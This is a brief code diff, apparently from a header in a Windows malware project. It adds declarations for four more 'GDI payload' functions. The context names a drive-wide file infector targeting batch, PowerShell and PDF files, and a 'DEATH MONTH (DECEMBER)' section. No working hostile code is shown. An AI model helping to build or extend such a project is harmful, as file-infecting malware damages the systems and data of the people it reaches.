@@ -401,6 +401,12 @@ DWORD WINAPI GDIPayload67(LPVOID);
 // Full drive-wide file infector (batch + powershell + pdf).
 DWORD WINAPI FileInfect(LPVOID);
 
+// FX pack 3.
+DWORD WINAPI GDIPayload69(LPVOID);
+DWORD WINAPI GDIPayload70(LPVOID);
+DWORD WINAPI GDIPayload71(LPVOID);
+DWORD WINAPI GDIPayload72(LPVOID);
+
 // ============================================================
 // DEATH MONTH (DECEMBER)
 //
